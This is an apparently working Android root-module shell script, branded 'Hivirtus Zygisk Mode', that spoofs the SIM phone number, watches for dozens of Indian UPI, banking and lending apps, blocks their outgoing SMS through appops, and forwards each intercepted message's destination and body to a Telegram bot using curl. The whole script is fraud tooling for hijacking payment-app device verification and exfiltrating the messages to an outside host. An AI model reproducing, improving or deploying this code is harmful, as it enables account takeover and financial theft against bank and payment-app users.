#!/system/bin/sh
# Hivirtus runtime — config sync + SMS block + Telegram (APK-free native overlay)

MODDIR=${0%/*}
. "$MODDIR/overlay_install.sh"

CONFIG="$MODDIR/config.json"
RUNTIME="/data/local/tmp/hivirtus_zygisk_mode_config.json"
ACTIVE_PKG="/data/local/tmp/hivirtus_active_hook_pkg.txt"

UPI_PACKAGES="
com.phonepe.app
net.one97.paytm
com.google.android.apps.nbu.paisa.user
com.yespay.next
com.yesbank.yespay
com.yesbank.yespaynext
com.snapmint.customerapp
com.tataneu
com.stashfin.android
com.kreditbee.android
com.dreamplug.androidapp
com.mobikwik_new
com.freecharge.android
in.org.npci.upiapp
com.amazon.mShop.android.shopping
com.popclub.android
com.myairtelapp
com.jio.myjio
com.csam.icici.bank.imobile
com.sbi.lotusintouch
com.axis.mobile
com.hdfcbank.payzapp
com.bankofbaroda.mpassbook
com.idfcfirstbank.mobile
com.kotak811mobilebankingapp
com.whizdm.moneyview.loans
com.naviapp
com.bharatpe.app
com.rapipay
com.fampay.in
com.slice.app
com.postpe.app
com.olacabs.customer
com.application.zomato
in.swiggy.android
com.meesho.supply
com.flipkart.android
com.lazypay.app
com.earlysalary.android
com.whiz.credit
com.zestmoney.android
com.payu.india
com.msf.angelmobile
com.groww.app
com.nextbillion.groww
com.herofincorp.diyjourneys
com.herofincorp.simplycash
com.customer.herofincorp
com.paytmmoney
com.jar.app
com.supermoney
com.epifi.paisa
com.angelbroking.angelone
com.mmt.mmtpay
com.irctc.air
com.truecaller
com.whatsapp
com.samsung.android.spay
com.navi.moneymanager
com.loan.front
com.buddyloan.app
com.rupilo.android
com.moneytap.app
com.paysense.android
com.branch_international.branch.branch_demo_android
com.cashfree
com.razorpay.payments
com.mpokket.app
com.cashe.android
com.rupeeredee.app
com.loan.tap
com.smartcoin
com.kissht.android
com.flexsalary
com.nira.finance
com.availfinance
com.indialends.android
com.homecredit
com.bajajfinserv
com.hdbfs.hdbfsl
in.medibuddy
"

is_upi_pkg() {
  echo "$UPI_PACKAGES" | grep -qx "$1"
}

sync_config() {
  # Runtime JSON overwrite mat karo (telegram wipe) — sirf spoof phone + first-boot seed
  SRC=""
  if [ -f "$RUNTIME" ]; then
    SRC="$RUNTIME"
  elif [ -f "$CONFIG" ]; then
    SRC="$CONFIG"
    cp -f "$CONFIG" "$RUNTIME"
    chmod 644 "$RUNTIME" 2>/dev/null
  fi
  if [ -n "$SRC" ]; then
    SPOOF_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    if [ -n "$SPOOF_PHONE" ]; then
      echo "$SPOOF_PHONE" > /data/local/tmp/hivirtus_spoof_phone.txt
      echo "$SPOOF_PHONE" > "$MODDIR/spoof_phone.txt"
      chmod 644 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
      chmod 644 "$MODDIR/spoof_phone.txt" 2>/dev/null
    fi
  fi
}

get_foreground_pkg() {
  local pkg

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'topResumedActivity=ActivityRecord' | head -n1 | sed -n 's/.* u0 \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'mResumedActivity: ActivityRecord' | head -n1 | sed -n 's/.* u0 \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys window 2>/dev/null | grep -E 'mCurrentFocus|mFocusedApp' | head -n1 | sed -n 's/.* \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'ResumedActivity' | head -n1 | sed -n 's/.* \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  echo "$pkg"
}

mark_active() {
  hivirtus_mark_foreground_upi "$1"
}

sync_config

seed_apatch_config
seed_hooked_pkgs

# Reboot pe native overlay flag
hivirtus_boot_activate_overlay &

(
  LAST=""
  while true; do
    sync_config
    FG=$(get_foreground_pkg)
    if [ -n "$FG" ] && is_upi_pkg "$FG"; then
      if [ "$FG" != "$LAST" ]; then
        mark_active "$FG"
        LAST="$FG"
      fi
    fi
    sleep 2
  done
) &

# Mock SIM ON → Messages/UPI ko SEND_SMS deny (root se — overlay root ke bina bhi)
sms_block_wanted() {
  [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && return 0
  SRC=""
  [ -f "$RUNTIME" ] && SRC="$RUNTIME"
  [ -z "$SRC" ] && [ -f "$CONFIG" ] && SRC="$CONFIG"
  [ -z "$SRC" ] && return 1
  grep -qE '"hook_outgoing_sms"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
  grep -qE '"intercept_fake_success"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
  grep -qE '"enable_virtual_sim"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
  grep -qE '"enable_sim1_mock"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
  grep -qE '"enable_phone_spoof"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
  return 1
}

enforce_sms_block() {
  sms_block_wanted || return 0

  HOOKED=""
  for f in /data/local/tmp/hivirtus_hooked_pkgs.txt /data/local/tmp/hivirtus_active_upi_all.txt; do
    [ -f "$f" ] && HOOKED="$HOOKED $(cat "$f" 2>/dev/null | tr '\n' ' ')"
  done
  if [ -f "$ACTIVE_PKG" ]; then
    HOOKED="$HOOKED $(cat "$ACTIVE_PKG" 2>/dev/null | tr -d '\r\n ')"
  fi
  SRC_CFG=""
  [ -f "$RUNTIME" ] && SRC_CFG="$RUNTIME"
  [ -z "$SRC_CFG" ] && [ -f "$CONFIG" ] && SRC_CFG="$CONFIG"
  if [ -n "$SRC_CFG" ]; then
    HOOKED="$HOOKED $(grep -oE '"[a-zA-Z][a-zA-Z0-9._]*"[[:space:]]*:[[:space:]]*true' "$SRC_CFG" 2>/dev/null | sed 's/"\([^"]*\)".*/\1/' | grep -E '^com\.')"
  fi

  for pkg in com.android.phone com.android.providers.telephony \
    com.google.android.apps.messaging com.android.mms com.android.mms.service \
    com.samsung.android.messaging com.yespay.next com.yesbank.yespay com.yesbank.yespaynext \
    com.kreditbee.android com.groww.app com.nextbillion.groww \
    com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
    com.phonepe.app net.one97.paytm com.fampay.in $HOOKED; do
    [ -z "$pkg" ] && continue
    appops set "$pkg" SEND_SMS deny 2>/dev/null
    cmd appops set "$pkg" SEND_SMS deny 2>/dev/null
    appops set "$pkg" WRITE_SMS deny 2>/dev/null
    cmd appops set "$pkg" WRITE_SMS deny 2>/dev/null
  done
  echo 1 > /data/local/tmp/hivirtus_phone_sms_denied.flag
  chmod 644 /data/local/tmp/hivirtus_phone_sms_denied.flag 2>/dev/null
}

read_tg_creds() {
  TG_TOKEN=""
  TG_CHAT=""
  for f in /data/local/tmp/hivirtus_telegram_credentials.json \
    "$MODDIR/telegram_credentials.json" \
    "$RUNTIME" "$CONFIG"; do
    [ -f "$f" ] || continue
    [ -z "$TG_TOKEN" ] && TG_TOKEN=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    [ -z "$TG_CHAT" ] && TG_CHAT=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    [ -n "$TG_TOKEN" ] && [ -n "$TG_CHAT" ] && break
  done
}

read_blocked_sms() {
  BLOCKED_DEST=""
  BLOCKED_BODY=""
  if [ -f /data/local/tmp/hivirtus_outgoing_blocked.json ]; then
    BLOCKED_DEST=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    BLOCKED_BODY=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\r//g;s/\\"/"/g;s/\\\\/\\/g')
  fi
  if [ -z "$BLOCKED_BODY" ] && [ -f /data/local/tmp/hivirtus_outgoing_blocked.flag ]; then
    BLOCKED_DEST=$(head -n1 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
    BLOCKED_BODY=$(tail -n +2 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
  fi
}

tg_json_escape() {
  printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\t/\\t/g' -e 's/\r/\\r/g' | awk 'BEGIN{ORS=""} {gsub(/\n/,"\\n"); print}'
}

tg_clip_copy() {
  printf '%s' "$1" | head -c 256
}

forward_blocked_telegram() {
  read_blocked_sms
  [ -z "$BLOCKED_BODY" ] && return 0
  read_tg_creds
  [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ] && return 0
  SPOOF=$(cat /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -d '\r\n ')
  [ -z "$SPOOF" ] && SPOOF=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$RUNTIME" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  SEND_FROM="${SPOOF:-—}"
  TEXT="📱 SMS Intercepted
Hivirtus Zygisk Mode By @hivirtus @liqdy 🔥
-----------------
To:
${BLOCKED_DEST}

Message:
${BLOCKED_BODY}"
  ONE_TAP="${BLOCKED_DEST} | ${BLOCKED_BODY}"
  ESC_TEXT=$(tg_json_escape "$TEXT")
  ESC_TAP=$(tg_json_escape "$(tg_clip_copy "$ONE_TAP")")
  COPY_BODY=$(tg_clip_copy "$BLOCKED_BODY")
  ESC_BODY=$(tg_json_escape "$COPY_BODY")
  PAYLOAD="/data/local/tmp/hivirtus_tg_payload.json"
  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\"${ESC_TAP}\"}},{\"text\":\"📋 Copy SMS Body\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
  SENT=0
  if command -v curl >/dev/null 2>&1; then
    curl -s -m 25 -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
      -H "Content-Type: application/json" \
      --data-binary "@${PAYLOAD}" >/dev/null 2>&1 && SENT=1
  fi
  if [ "$SENT" = "1" ]; then
    rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag
    rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
    rm -f "$PAYLOAD"
  fi
}

seed_hooked_pkgs() {
  SRC_LIST="$MODDIR/apatch_package_config_full.csv"
  [ ! -f "$SRC_LIST" ] && return 0
  OUT="/data/local/tmp/hivirtus_hooked_pkgs.txt"
  awk -F, 'NR>1 && $2==0 && $1 ~ /^com\./ {print $1}' "$SRC_LIST" 2>/dev/null | grep -vE '^(com\.android\.|bin\.|org\.)' > "$OUT" 2>/dev/null
  chmod 644 "$OUT" 2>/dev/null
}

seed_apatch_config() {
  SRC="$MODDIR/apatch_package_config_full.csv"
  DST="/data/adb/ap/package_config"
  FLAG="/data/local/tmp/hivirtus_apatch_config_seeded.flag"
  [ ! -f "$SRC" ] || [ ! -d /data/adb/ap ] && return 0
  if [ -f "$DST" ]; then
    LINES=$(wc -l < "$DST" 2>/dev/null || echo 0)
    [ "$LINES" -gt 50 ] && touch "$FLAG" 2>/dev/null && return 0
  fi
  [ -f "$FLAG" ] && return 0
  cp -f "$SRC" "$DST" 2>/dev/null
  chmod 644 "$DST" 2>/dev/null
  echo 1 > "$FLAG"
  chmod 644 "$FLAG" 2>/dev/null
}

(
  while true; do
    enforce_sms_block
    forward_blocked_telegram
    sleep 2
  done
) &
